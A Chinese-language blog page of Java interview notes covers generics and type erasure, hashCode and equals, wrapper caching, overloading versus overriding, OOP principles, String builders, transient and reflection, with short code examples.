<h3 id="import-java和javax-的区别"><a href="#import-java和javax-的区别" class="headerlink" title="import java和javax 的区别?"></a>import java和javax 的区别?</h3><p>刚开始的时候 JavaAPI 所必需的包是 java 开头的包，javax 当时只是扩展 API 包来使用。然而随着时间的推移，javax 逐渐地扩展成为 Java API 的组成部分。但是，将扩展从 javax 包移动到 java 包确实太麻烦了，最终会破坏一堆现有的代码。因此，最终决定 javax 包将成为标准 API 的一部分。</p>
<p>所以，实际上 java 和 javax 没有区别。</p>
<h3 id="为什么说Java语言“编译与解释并存”"><a href="#为什么说Java语言“编译与解释并存”" class="headerlink" title="为什么说Java语言“编译与解释并存”?"></a>为什么说Java语言“编译与解释并存”?</h3><p>高级编程语言按照程序的执行方式分为编译型和解释型两种。简单来说，编译型语言是指编译器针对特定的操作系统将源代码一次性翻译成可被该平台执行的机器码；解释型语言是指解释器对源程序逐行解释成特定平台的机器码并立即执行。比如，<strong>你想阅读一本英文名著，你可以找一个英文翻译人员帮助你阅读， 有两种选择方式，你可以先等翻译人员将全本的英文名著（也就是源码）都翻译成汉语，再去阅读，也可以让翻译人员翻译一段，你在旁边阅读一段，慢慢把书读完。</strong></p>
<p>Java 语言既具有编译型语言的特征，也具有解释型语言的特征，因为 Java 程序要经过先编译，后解释两个步骤。由 Java 编写的程序需要先经过编译步骤，生成字节码（*.class 文件），这种字节码必须由 Java 解释器来解释执行。因此，可以认为 Java 语言编译与解释并存。</p>
<h3 id="字符型常量和字符串常量区别"><a href="#字符型常量和字符串常量区别" class="headerlink" title="字符型常量和字符串常量区别"></a>字符型常量和字符串常量区别</h3><ul>
<li><p>形式上：字符常量是单引号引起的一个字符；字符串常量是双引号引起的0个或若干的字符。</p>
</li>
<li><p>含义上：字符常量相当于一个整形值（ASCII值），可以参与表达式的运算；字符串常量代表一个地址值（该字符串在内存中的存放位置）。</p>
</li>
<li><p>占内存大小：字符常量只占两个字节；字符串常量占若干个字节。</p>
</li>
</ul>
<blockquote>
<p>Java基本类型所占存储空间的大小不像其他语言那样随机器硬件架构的变化而变化。这种所占存储空间的大小不变的性质是Java程序比其他大多数语言编写的程序更具有可移植性的原因之一。</p>
</blockquote>
<h3 id="标识符和关键字的区别"><a href="#标识符和关键字的区别" class="headerlink" title="标识符和关键字的区别"></a>标识符和关键字的区别</h3><p>标识符就是一个名字。</p>
<p>关键字是被赋予特殊含义的标识符。比如警察局就是一个关键字。</p>
<h3 id="Java泛型-什么是类型擦除-介绍一下常用的通配符"><a href="#Java泛型-什么是类型擦除-介绍一下常用的通配符" class="headerlink" title="Java泛型?什么是类型擦除? 介绍一下常用的通配符?"></a>Java泛型?什么是类型擦除? 介绍一下常用的通配符?</h3><p>Java 泛型（generics）是 JDK 5 中引入的一个新特性，泛型提供了编译时类型安全检测机制，该机制允许程序员在编译时检测到非法的类型。泛型的本质是参数化类型，也就是说所操作的数据类型被指定为一个参数。</p>
<p>Java的泛型是伪泛型，在编译期间，所有的泛型信息都会被擦掉，这也就是类型擦除。在运行期间通过反射创建对象就可以任意添加其他类型的对象。</p>
<p>Java编译器会在编译时尽可能的发现可能出错的地方，但是仍然无法在运行时刻出现的类型转换异常的情况，类型擦除也是Java的泛型与C++模板机制实现方式之间的重要区别。</p>
<p>类型检查就是针对引用的，谁是一个引用，用这个引用调用泛型方法，就会对这个引用调用的方法进行类型检测，而无关它真正引用的对象。</p>
<p><a href="https://www.cnblogs.com/wuqinglong/p/9456193.html">《Java 泛型类型擦除以及类型擦除带来的问题》</a></p>
<p>原始类型就是擦除了泛型信息，最后在字节码中的类型变量的真正类型，无论何时定义一个泛型，相应的原始类型都会被自动提供，类型变量擦除，并使用其限定类型（无限定的变量用Object）替换。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Pair</span>&lt;T&gt; &#123;  </span><br><span class="line">    <span class="keyword">private</span> T value;  </span><br><span class="line">    <span class="keyword">public</span> T <span class="title function_">getValue</span><span class="params">()</span> &#123;  </span><br><span class="line">        <span class="keyword">return</span> value;  </span><br><span class="line">    &#125;  </span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setValue</span><span class="params">(T  value)</span> &#123;  </span><br><span class="line">        <span class="built_in">this</span>.value = value;  </span><br><span class="line">    &#125;  </span><br><span class="line">&#125; </span><br><span class="line"><span class="comment">// pair的原始类型</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Pair</span> &#123;  </span><br><span class="line">    <span class="keyword">private</span> Object value;  </span><br><span class="line">    <span class="keyword">public</span> Object <span class="title function_">getValue</span><span class="params">()</span> &#123;  </span><br><span class="line">        <span class="keyword">return</span> value;  </span><br><span class="line">    &#125;  </span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setValue</span><span class="params">(Object  value)</span> &#123;  </span><br><span class="line">        <span class="built_in">this</span>.value = value;  </span><br><span class="line">    &#125;  </span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// Pair如果这样声明的话，那么原始类型就是Comparable</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Pair</span>&lt;T <span class="keyword">extends</span> <span class="title class_">Comparable</span>&gt; &#123;&#125;</span><br></pre></td></tr></table></figure>

<p>在调用泛型方法时，可以指定泛型，也可以不指定泛型。</p>
<ul>
<li>在不指定泛型的情况下，泛型变量的类型为该方法中的几种类型的同一父类的最小级，直到Object；</li>
<li>在指定泛型的情况下，该方法的几种类型必须是该泛型实例的类型或者其子类。</li>
</ul>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Test</span> &#123;  </span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;  </span><br><span class="line">        <span class="comment">/**不指定泛型的时候*/</span>  </span><br><span class="line">        <span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> Test.add(<span class="number">1</span>， <span class="number">2</span>); <span class="comment">//这两个参数都是Integer，所以T为Integer类型  </span></span><br><span class="line">        <span class="type">Number</span> <span class="variable">f</span> <span class="operator">=</span> Test.add(<span class="number">1</span>， <span class="number">1.2</span>); <span class="comment">//这两个参数一个是Integer，以风格是Float，所以取同一父类的最小级，为Number  </span></span><br><span class="line">        <span class="type">Object</span> <span class="variable">o</span> <span class="operator">=</span> Test.add(<span class="number">1</span>， <span class="string">&quot;asd&quot;</span>); <span class="comment">//这两个参数一个是Integer，以风格是Float，所以取同一父类的最小级，为Object  </span></span><br><span class="line"></span><br><span class="line">        <span class="comment">/**指定泛型的时候*/</span>  </span><br><span class="line">        <span class="type">int</span> <span class="variable">a</span> <span class="operator">=</span> Test.&lt;Integer&gt;add(<span class="number">1</span>， <span class="number">2</span>); <span class="comment">//指定了Integer，所以只能为Integer类型或者其子类  </span></span><br><span class="line">        <span class="type">int</span> <span class="variable">b</span> <span class="operator">=</span> Test.&lt;Integer&gt;add(<span class="number">1</span>， <span class="number">2.2</span>); <span class="comment">//编译错误，指定了Integer，不能为Float  </span></span><br><span class="line">        <span class="type">Number</span> <span class="variable">c</span> <span class="operator">=</span> Test.&lt;Number&gt;add(<span class="number">1</span>， <span class="number">2.2</span>); <span class="comment">//指定为Number，所以可以为Integer和Float  </span></span><br><span class="line">    &#125;  </span><br><span class="line"></span><br><span class="line">    <span class="comment">//这是一个简单的泛型方法  </span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> &lt;T&gt; T <span class="title function_">add</span><span class="params">(T x，T y)</span>&#123;  </span><br><span class="line">        <span class="keyword">return</span> y;  </span><br><span class="line">    &#125;  </span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>因为类型检查就是编译时完成的，new ArrayList()只是在内存中开辟了一个存储空间，可以存储任何类型对象，而真正设计类型检查的是它的引用，因为是使用它引用list1来调用它的方法，比如说调用add方法，所以list1引用能完成泛型类型的检查。而引用list2没有使用泛型，所以不行。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">ArrayList&lt;String&gt; list1 = <span class="keyword">new</span> <span class="title class_">ArrayList</span>(); <span class="comment">//可以实现与完全使用泛型参数一样的效果</span></span><br><span class="line"><span class="type">ArrayList</span> <span class="variable">list2</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ArrayList</span>&lt;String&gt;(); <span class="comment">//没有效果，会有编译时警告</span></span><br><span class="line"><span class="keyword">new</span> <span class="title class_">ArrayList</span>&lt;String&gt;().add(<span class="string">&quot;11&quot;</span>); <span class="comment">//编译通过  </span></span><br><span class="line"><span class="keyword">new</span> <span class="title class_">ArrayList</span>&lt;String&gt;().add(<span class="number">22</span>);   <span class="comment">//编译错误  </span></span><br></pre></td></tr></table></figure>

<h5 id="通配符"><a href="#通配符" class="headerlink" title="通配符"></a>通配符</h5><ul>
<li>？ 表示不确定的 Java 类型</li>
<li>T （type）表示具体的一个 Java 类型</li>
<li>K V （key value）分别代表 Java 键值中的Key Value</li>
<li>E （element） 代表 Element</li>
</ul>
<p>更多关于 Java 泛型中的通配符可以查看这篇文章：<a href="https://juejin.im/post/5d5789d26fb9a06ad0056bd9">《聊一聊-JAVA 泛型中的通配符 T，E，K，V，？》</a></p>
<p>？和 T 都表示不确定的类型，区别在于可以对 T 进行操作，但是对 ？ 不行，比如如下这种 ：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 可以</span></span><br><span class="line"><span class="type">T</span> <span class="variable">t</span> <span class="operator">=</span> operate();</span><br><span class="line"></span><br><span class="line"><span class="comment">// 不可以</span></span><br><span class="line">？ car = operate();</span><br></pre></td></tr></table></figure>

<p>区别1：通过T来确保泛型参数的一致性</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 通过 T 来 确保 泛型参数的一致性</span></span><br><span class="line"><span class="keyword">public</span> &lt;T <span class="keyword">extends</span> <span class="title class_">Number</span>&gt; <span class="keyword">void</span></span><br><span class="line"><span class="title function_">test</span><span class="params">(List&lt;T&gt; dest， List&lt;T&gt; src)</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//通配符是 不确定的，所以这个方法不能保证两个 List 具有相同的元素类型</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">void</span></span><br><span class="line"><span class="title function_">test</span><span class="params">(List&lt;? extends Number&gt; dest， List&lt;? extends Number&gt; src)</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>区别2：类型参数可以多重限定而通配符不行</p>
<p>区别3：通配符可以使用超类限定而类型参数不行</p>
<p>类型参数 T 只具有 一种 类型限定方式：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">T extends A</span><br></pre></td></tr></table></figure>

<p>但是通配符 ? 可以进行 两种限定：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">? extends A</span><br><span class="line">? super A</span><br></pre></td></tr></table></figure>

<h3 id="x3D-x3D-和-equals"><a href="#x3D-x3D-和-equals" class="headerlink" title="&#x3D;&#x3D; 和 equals"></a>&#x3D;&#x3D; 和 equals</h3><p>string方法的equals重写过了</p>
<h3 id="hashCode-与-equals"><a href="#hashCode-与-equals" class="headerlink" title="hashCode() 与 equals()"></a>hashCode() 与 equals()</h3><p>hashCode() 的作用是获取哈希码，也称为散列码；它实际上是返回一个 int 整数。这个哈希码的作用是确定该对象在哈希表中的索引位置。hashCode()定义在 JDK 的 Object 类中，Java 中的任何类都包含有 hashCode() 函数。另外需要注意的是： Object 的 hashCode() 方法是本地方法，也就是用 C 语言或 C++ 实现的，该方法通常用来将对象的内存地址转换为整数之后返回。</p>
<p>当你把对象加入 HashSet 时，HashSet 会先计算对象的 hashcode 值来判断对象加入的位置，同时也会与其他已经加入的对象的 hashcode 值作比较，如果没有相符的 hashcode，HashSet 会假设对象没有重复出现。但是如果发现有相同 hashcode 值的对象，这时会调用 equals() 方法来检查 hashcode 相等的对象是否真的相同。如果两者相同，HashSet就不会让其加入操作成功。如果不同的话，就会重新散列到其他位置。</p>
<p>如果两个对象相等，则 hashcode 一定也是相同的。两个对象相等，对两个对象分别调用 equals 方法都返回 true。但是，两个对象有相同的 hashcode 值，它们也不一定是相等的 。因此，equals 方法被覆盖过，则 hashCode() 方法也必须被覆盖。</p>
<blockquote>
<p>hashCode()的默认行为是对堆上的对象产生独特值。如果没有重写 hashCode()，则该 class 的两个对象无论如何都不会相等（即使这两个对象指向相同的数据）</p>
</blockquote>
<h3 id="八种基本类型、包装类、常量池"><a href="#八种基本类型、包装类、常量池" class="headerlink" title="八种基本类型、包装类、常量池"></a>八种基本类型、包装类、常量池</h3><p>byte， char， short， int， long， float， double， boolean</p>
<p>1，2，2，4，8，4，8， 未定义</p>
<p>Byte， Character， Short， Integer， Long， Float， Double， Boolean</p>
<p>Java 里使用 long 类型的数据一定要在数值后面加上 L，否则将作为整型解析。</p>
<p>Java 基本类型的包装类的大部分都实现了常量池技术， Byte、Short、Integer和Long默认创建了数值[-128，127] 的相应类型的缓存数据，Character 创建了数值在[0，127]范围的缓存数据，Boolean 直接返回 True Or False。</p>
<p><strong>Integer的一个例子</strong></p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="type">Integer</span> <span class="variable">i1</span> <span class="operator">=</span> <span class="number">40</span>;</span><br><span class="line"><span class="type">Integer</span> <span class="variable">i2</span> <span class="operator">=</span> <span class="number">40</span>;</span><br><span class="line"><span class="type">Integer</span> <span class="variable">i3</span> <span class="operator">=</span> <span class="number">0</span>;</span><br><span class="line"><span class="type">Integer</span> <span class="variable">i4</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Integer</span>(<span class="number">40</span>);</span><br><span class="line"><span class="type">Integer</span> <span class="variable">i5</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Integer</span>(<span class="number">40</span>);</span><br><span class="line"><span class="type">Integer</span> <span class="variable">i6</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Integer</span>(<span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">System.out.println(<span class="string">&quot;i1=i2   &quot;</span> + (i1 == i2));</span><br><span class="line">System.out.println(<span class="string">&quot;i1=i2+i3   &quot;</span> + (i1 == i2 + i3));</span><br><span class="line">System.out.println(<span class="string">&quot;i1=i4   &quot;</span> + (i1 == i4));</span><br><span class="line">System.out.println(<span class="string">&quot;i4=i5   &quot;</span> + (i4 == i5));</span><br><span class="line">System.out.println(<span class="string">&quot;i4=i5+i6   &quot;</span> + (i4 == i5 + i6));</span><br><span class="line">System.out.println(<span class="string">&quot;40=i5+i6   &quot;</span> + (<span class="number">40</span> == i5 + i6));</span><br></pre></td></tr></table></figure>

<p>结果：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">i1=i2   true</span><br><span class="line">i1=i2+i3   true</span><br><span class="line">i1=i4   false</span><br><span class="line">i4=i5   false</span><br><span class="line">i4=i5+i6   true</span><br><span class="line">40=i5+i6   true</span><br></pre></td></tr></table></figure>

<p>解释：</p>
<p>语句 i4 &#x3D;&#x3D; i5 + i6，因为+这个操作符不适用于 Integer 对象，首先 i5 和 i6 进行自动拆箱操作，进行数值相加，即 i4 &#x3D;&#x3D; 40。然后 Integer 对象无法与数值进行直接比较，所以 i4 自动拆箱转为 int 值 40，最终这条语句转为 40 &#x3D;&#x3D; 40 进行数值比较。</p>
<h3 id="Java值传递"><a href="#Java值传递" class="headerlink" title="Java值传递?"></a>Java值传递?</h3><p>Java 程序设计语言总是采用按值调用。也就是说，方法得到的是所有参数值的一个拷贝，方法不能修改传递给它的任何参数变量的内容。</p>
<h3 id="重载和重写的区别"><a href="#重载和重写的区别" class="headerlink" title="重载和重写的区别"></a>重载和重写的区别</h3><p>重写发生在运行期，是子类对父类的允许访问的方法的实现过程进行重新编写。</p>
<ul>
<li><p>返回值类型、方法名、参数列表必须相同，抛出的异常范围小于等于父类，访问修饰符范围大于等于父类；</p>
</li>
<li><p>如果父类方法访问修饰符为 private&#x2F;final&#x2F;static 则子类就不能重写该方法，但是被 static 修饰的方法能够被再次声明；</p>
</li>
<li><p>构造方法无法被重写。</p>
</li>
</ul>
<p>综上：重写就是子类对父类方法的重新改造，外部样子不能改变，内部逻辑可以改变。</p>
<table>
<thead>
<tr>
<th>区别点</th>
<th>重载方法</th>
<th>重写方法</th>
</tr>
</thead>
<tbody><tr>
<td>发生范围</td>
<td>同一个类</td>
<td>子类</td>
</tr>
<tr>
<td>参数列表</td>
<td><strong>必须修改</strong></td>
<td>一定不能修改</td>
</tr>
<tr>
<td>返回类型</td>
<td>可修改</td>
<td>子类方法返回值类型应比父类方法返回值类型更小或相等</td>
</tr>
<tr>
<td>异常</td>
<td>可修改</td>
<td>子类方法声明抛出的异常类应比父类方法声明抛出的异常类更小或相等；</td>
</tr>
<tr>
<td>访问修饰符</td>
<td>可修改</td>
<td>一定不能做更严格的限制（可以降低限制）</td>
</tr>
<tr>
<td>发生阶段</td>
<td>编译期</td>
<td>运行期</td>
</tr>
</tbody></table>
<p><strong>方法的重写要遵循“两同两小一大”</strong></p>
<ul>
<li>“两同”即方法名相同、形参列表相同；</li>
<li>“两小”指的是子类方法返回值类型应比父类方法返回值类型更小或相等，子类方法声明抛出的异常类应比父类方法声明抛出的异常类更小或相等；</li>
<li>“一大”指的是子类方法的访问权限应比父类方法的访问权限更大或相等。</li>
</ul>
<p>⭐️ <strong>重写的返回值类</strong>型：如果方法的返回类型是void和基本数据类型，则返回值重写时不可修改。但是如果方法的返回值是引用类型，重写时是可以返回该引用类型的子类的。</p>
<h3 id="面向对象和面向过程的区别"><a href="#面向对象和面向过程的区别" class="headerlink" title="面向对象和面向过程的区别"></a>面向对象和面向过程的区别</h3><ul>
<li>面向过程：性能高。 因为类调用时需要实例化，开销比较大，比较消耗资源，所以当性能是最重要的考量因素的时候，比如单片机、嵌入式开发、Linux&#x2F;Unix 等一般采用面向过程开发。但是，面向过程没有面向对象易维护、易复用、易扩展。</li>
<li>面向对象：易维护、易复用、易扩展。 因为面向对象有封装、继承和多态的特性，所以可以设计出低耦合的系统，使系统更加灵活、更加易于维护。但是，面向对象性能比面向过程低。</li>
</ul>
<h3 id="构造器是否可被重写"><a href="#构造器是否可被重写" class="headerlink" title="构造器是否可被重写?"></a>构造器是否可被重写?</h3><p>Constructor 不能被 override（重写），但是可以 overload（重载），可以在一个类中有多个构造函数。</p>
<h3 id="在Java中定义一个不做事且没有参数的构造方法的作用"><a href="#在Java中定义一个不做事且没有参数的构造方法的作用" class="headerlink" title="在Java中定义一个不做事且没有参数的构造方法的作用"></a>在Java中定义一个不做事且没有参数的构造方法的作用</h3><p>Java 程序在执行子类的构造方法之前，如果没有用 super()来调用父类特定的构造方法，则会调用父类中“没有参数的构造方法”。因此，如果父类中只定义了有参数的构造方法，而在子类的构造方法中又没有用 super()来调用父类中特定的构造方法，则编译时将发生错误，因为 Java 程序在父类中找不到没有参数的构造方法可供执行。解决办法是在父类里加上一个不做事且没有参数的构造方法。帮助子类做初始化工作。</p>
<p>如果在类中你提供了其他有参的构造器，则编译器不会提供默认的无参构造器。</p>
<p>如果在类中你没有提供任何构造器，则编译器会提供一个默认的无参构造器。</p>
<p>如果你提供了一个构造器，你无须手动添加super()到你的构造器，编译器会默认添加。</p>
<p>如果父类未提供无参构造器，且子类没有使用super()调用父类有参构造的话编译器会报错。</p>
<p>如果构造器中添加了this引用该类的其他构造器，或者添加了super()调用父类构造器，this和super必须在构造器第一行，this引用其他构造器和super()语句不会同时出现。</p>
<h3 id="一个类的构造方法的作用是什么-若一个类没有声明构造方法，该程序能正确执行吗"><a href="#一个类的构造方法的作用是什么-若一个类没有声明构造方法，该程序能正确执行吗" class="headerlink" title="一个类的构造方法的作用是什么? 若一个类没有声明构造方法，该程序能正确执行吗?"></a>一个类的构造方法的作用是什么? 若一个类没有声明构造方法，该程序能正确执行吗?</h3><p>主要作用是完成对类对象的初始化工作。</p>
<p>可以执行。因为一个类即使没有声明构造方法也会有默认的不带参数的构造方法。如果添加了类的构造方法（无论是否有参），Java 就不会再添加默认的无参数的构造方法了，这时候，就不能直接 new 一个对象而不传递参数了。如果重载了有参的构造方法，记得都要把无参的构造方法也写出来（无论是否用到）。</p>
<p>构造方法:</p>
<ul>
<li><p>名字与类名相同。</p>
</li>
<li><p>没有返回值，但不能用 void 声明构造函数。</p>
</li>
<li><p>生成类的对象时自动执行，无需调用。</p>
</li>
</ul>
<h3 id="成员变量和局部变量"><a href="#成员变量和局部变量" class="headerlink" title="成员变量和局部变量"></a>成员变量和局部变量</h3><ul>
<li><p>语法形式上：成员变量是属于类，而局部变量是在代码块或方法中定义的变量或是方法的参数；成员变量可以被 public、private、static 等修饰符所修饰，而局部变量不能被访问控制修饰符及 static 所修饰；但是，成员变量和局部变量都能被 final 所修饰。</p>
</li>
<li><p>从变量在内存中的存储方式来看：如果成员变量是使用static修饰的，那么这个成员变量是属于类的，如果没有使用static修饰，这个成员变量是属于实例的。而对象存在于堆内存，局部变量则存在于栈内存。</p>
</li>
<li><p>从变量在内存中的生存时间上看：成员变量是对象的一部分，它随着对象的创建而存在，而局部变量随着方法的调用而自动消失。</p>
</li>
<li><p>成员变量（全局变量）是可以不经初始化的（一种情况例外：被 final 修饰的成员变量必须显式地赋值），在类加载过程的准备阶段即可给它赋予默认值，但局部变量使用前需要显示赋予初始值，javac不是推断不出不可以这样做，而是没有这么做，对于成员变量而言，其赋值和取值访问的先后顺序具有不确定性，对于成员变量可以在一个方法调用前赋值，也可以在方法调用后进行，这是运行时发生的，编译器确定不了，交给jvm去做比较合适。而对于局部变量而言，其赋值和取值访问顺序是确定的。这样设计是一种约束，尽最大程度减少使用者犯错的可能。假使局部变量可以使用默认值，可能总会无意间忘记赋值，进而导致不可预期的情况出现。</p>
</li>
</ul>
<h3 id="面向对象的三大特征"><a href="#面向对象的三大特征" class="headerlink" title="面向对象的三大特征"></a>面向对象的三大特征</h3><h4 id="封装"><a href="#封装" class="headerlink" title="封装"></a>封装</h4><p>封装是指把一个对象的状态信息（也就是属性）隐藏在对象内部，不允许外部对象直接访问对象的内部信息。但是可以提供一些可以被外界访问的方法来操作属性。就好像看不到挂在墙上的空调的内部的零件信息（也就是属性），但是可以通过遥控器（方法）来控制空调。如果属性不想被外界访问，大可不必提供方法给外界访问。但是如果一个类没有提供给外界访问的方法，那么这个类也没有什么意义了。就好像如果没有空调遥控器，那么就无法操控空凋制冷，空调本身就没有意义了（当然现在还有很多其他方法 ，这里只是为了举例子）。</p>
<h4 id="继承"><a href="#继承" class="headerlink" title="继承"></a>继承</h4><p>不同类型的对象，相互之间经常有一定数量的共同点。例如，小明同学、小红同学、小李同学，都共享学生的特性（班级、学号等）。同时，每一个对象还定义了额外的特性使得他们与众不同。例如小明的数学比较好，小红的性格惹人喜爱；小李的力气比较大。继承是使用已存在的类的定义作为基础建立新类的技术，新类的定义可以增加新的数据或新的功能，也可以用父类的功能，但不能选择性地继承父类。通过使用继承，可以快速地创建新的类，可以提高代码的重用，程序的可维护性，节省大量创建新类的时间 ，提高开发效率。</p>
<p><strong>关于继承如下 3 点请记住：</strong></p>
<ul>
<li><p>子类拥有父类对象所有的属性和方法（包括私有属性和私有方法），但是父类中的私有属性和私有方法子类是无法访问，只是拥有。</p>
</li>
<li><p>子类可以拥有自己属性和方法，即子类可以对父类进行扩展。</p>
</li>
<li><p>子类可以用自己的方式实现父类的方法。</p>
</li>
</ul>
<h4 id="多态"><a href="#多态" class="headerlink" title="多态"></a>多态</h4><p>多态，顾名思义，表示一个对象具有多种的状态。具体表现为父类的引用指向子类的实例。</p>
<p>多态分为编译时多态和运行时多态。其中编译时多态是静态的，主要是指方法的重载，它是根据参数列表的不同来区分不同的函数，通过编辑之后会变成两个不同的函数，在运行时谈不上多态。而运行时多态是动态的，它是通过动态绑定来实现的，也就是所说的多态性。</p>
<p><strong>多态的特点:</strong></p>
<ul>
<li>对象类型和引用类型之间具有继承（类）&#x2F;实现（接口）的关系；</li>
<li>引用类型变量发出的方法调用的到底是哪个类中的方法，必须在程序运行期间才能确定；</li>
<li>多态不能调用“只在子类存在但在父类不存在”的方法；</li>
<li>如果子类重写了父类的方法，真正执行的是子类覆盖的方法，如果子类没有覆盖父类的方法，执行的是父类的方法。</li>
</ul>
<h3 id="在一个静态方法内调用一个非静态成员为什么是非法的"><a href="#在一个静态方法内调用一个非静态成员为什么是非法的" class="headerlink" title="在一个静态方法内调用一个非静态成员为什么是非法的"></a>在一个静态方法内调用一个非静态成员为什么是非法的</h3><p>类的静态成员（变量或方法）属于类本身，在类加载的时候就会分配内存，可以通过类名直接访问非静态成员（变量或方法）属于类的对象，只有在类的对象产生（实例化）时才会分配内存，然后通过类的对象（实例）去访问。<br>所以，如果一个类的静态方法去调用非静态方法或变量的时候，因为类的静态方法存在的时候，类的非静态成员可能不存在，访问一个内存中不存在的东西当然会出错。</p>
<h3 id="String-StringBuffer-和-StringBuilder"><a href="#String-StringBuffer-和-StringBuilder" class="headerlink" title="String StringBuffer 和 StringBuilder"></a>String StringBuffer 和 StringBuilder</h3><p>String s&#x3D;“This is only ”+”simple”+”test”会被JVM直接优化成String s&#x3D;“This is only simple test”。</p>
<p>简单的来说：String 类中使用 final 关键字修饰字符数组来保存字符串，private final char value[]，所以String 对象是不可变的。</p>
<blockquote>
<p>在 Java 9 之后，String 、StringBuilder 与 StringBuffer 的实现改用 byte 数组存储字符串。</p>
</blockquote>
<p>而 StringBuilder 与 StringBuffer 都继承自 AbstractStringBuilder 类，在 AbstractStringBuilder 中也是使用字符数组保存字符串char[] value 但是没有用 final 关键字修饰，所以这两种对象都是可变的。</p>
<p>StringBuilder 与 StringBuffer 的构造方法都是调用父类构造方法也就是AbstractStringBuilder 实现的。</p>
<p>String 中的对象是不可变的，也就可以理解为常量，线程安全。AbstractStringBuilder 是 StringBuilder 与 StringBuffer 的公共父类，定义了一些字符串的基本操作，如 expandCapacity、append、insert、indexOf 等公共方法。StringBuffer 对方法加了同步锁或者对调用的方法加了同步锁，所以是线程安全的。StringBuilder 并没有对方法进行加同步锁，所以是非线程安全的。</p>
<p>每次对 String 类型进行改变的时候，都会生成一个新的 String 对象，然后将指针指向新的 String 对象。StringBuffer 每次都会对 StringBuffer 对象本身进行操作，而不是生成新的对象并改变对象引用。相同情况下使用 StringBuilder 相比使用 StringBuffer 仅能获得 10%~15% 左右的性能提升，但却要冒多线程不安全的风险。</p>
<p>对于三者使用的总结：</p>
<ul>
<li><p>操作少量的数据：适用 String；</p>
</li>
<li><p>单线程操作字符串缓冲区下操作大量数据：适用 StringBuilder；</p>
</li>
<li><p>多线程操作字符串缓冲区下操作大量数据：适用 StringBuffer。</p>
</li>
</ul>
<h3 id="Java序列化中如果有些字段不想进行序列化，怎么办"><a href="#Java序列化中如果有些字段不想进行序列化，怎么办" class="headerlink" title="Java序列化中如果有些字段不想进行序列化，怎么办?"></a>Java序列化中如果有些字段不想进行序列化，怎么办?</h3><p>对于不想序列话的变量，可以使用transient关键字修饰。</p>
<p>transient关键字的作用是：阻止实例中哪些用此关键字修饰的变量序列化；当对象被反序列化时，被transient修饰的变量值不会被持久化和恢复；transient只能修饰变量，不能修饰类和方法。</p>
<h3 id="获取键盘输入的常用方法"><a href="#获取键盘输入的常用方法" class="headerlink" title="获取键盘输入的常用方法"></a>获取键盘输入的常用方法</h3><p>方法一：通过scanner</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="type">Scanner</span> <span class="variable">input</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Scanner</span>(System.in);</span><br><span class="line"><span class="type">String</span> <span class="variable">s</span> <span class="operator">=</span> input.nextLine();</span><br><span class="line">input.close();</span><br></pre></td></tr></table></figure>

<p>方法二：通过BufferedReader</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="type">BufferedReader</span> <span class="variable">input</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">BufferedReader</span>(<span class="keyword">new</span> <span class="title class_">InputStreamReader</span>(System.in));</span><br><span class="line"><span class="type">String</span> <span class="variable">s</span> <span class="operator">=</span> input.readLine();</span><br></pre></td></tr></table></figure>

<h3 id="反射机制"><a href="#反射机制" class="headerlink" title="反射机制"></a>反射机制</h3><p>JAVA 反射机制是在运行状态中，对于任意一个类，都能够知道这个类的所有属性和方法；对于任意一个对象，都能够调用它的任意一个方法和属性；这种动态获取的信息以及动态调用对象的方法的功能称为 java 语言的反射机制。</p>
<p>一个类在内存中只有一个class对象，一个类被加载后，类的整个结构都会封装在class对象中。</p>
<h3 id="静态编译和动态编译"><a href="#静态编译和动态编译" class="headerlink" title="静态编译和动态编译"></a>静态编译和动态编译</h3><p>在编译时确定对象，绑定对象;</p>
<p>运行时确定对象，绑定对象;</p>
<h3 id="反射机制优缺点"><a href="#反射机制优缺点" class="headerlink" title="反射机制优缺点"></a>反射机制优缺点</h3><p>优点：运行期类型的判断，动态加载类，提高代码灵活度。</p>
<p>缺点：</p>
<ul>
<li><p>性能瓶颈：反射相当于一系列解释操作，通知jvm要做的事情，性能比直接Java代码要慢很多。</p>
</li>
<li><p>安全问题：可以动态操作改变类属性的同时也增加了类的安全隐患。</p>
</li>
</ul>
<p>反射修改string值，因为final是编译期关键字，只在编译期进行检查。</p>
